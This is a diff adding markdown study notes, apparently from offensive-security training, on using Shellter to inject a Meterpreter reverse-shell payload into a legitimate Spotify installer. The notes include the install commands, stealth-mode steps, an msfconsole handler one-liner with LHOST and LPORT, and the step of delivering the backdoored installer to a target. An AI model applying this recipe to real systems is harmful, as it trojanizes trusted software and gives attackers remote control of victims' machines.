@@ -1,0 +1,23 @@
+- Shellter
+	- designed to run on windows
+	- dynamic shellcode injection tool 
+		1.  uses a number of novel and advanced techniques to backdoor a valid and non-malicious executable file with a malicious shellcode payload
+		2.  performs a thorough analysis of the target PE file and the execution paths
+		3.  determines where it can inject our shellcode without relying on traditional injection techniques
+		4. attempts to use the existing PE Import Address Table (IAT) entries to locate functions that will be used for the memory allocation, transfer, and execution of our payload
+	- shelter pro = even more bad ass
+	- example:
+		1. apt-cache search shellter
+		2.  sudo apt install shellter
+			- /usr/share/windows-resources/shellter/shellter.exe
+		3. add installer location of PE
+			- **/home/kali/desktop/spotifysetup.exe**
+		4. Stealth Mode
+			- attempts to restore the execution flow of the PE post exploit
+			- custom payloads need to terminate by exiting the current thread
+		5. Set parameters
+		6. Shelter will inject the payload into the Spotify installer and attempt to reach the first instruction of the payload
+		7. Configure listener on Kali with the meterpreter payload.
+			- msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;
+		8. transfer backdoored installer over to the TGT
+			- Shellter obfuscates both the payload as well as the payload decoder before injecting them into the PE
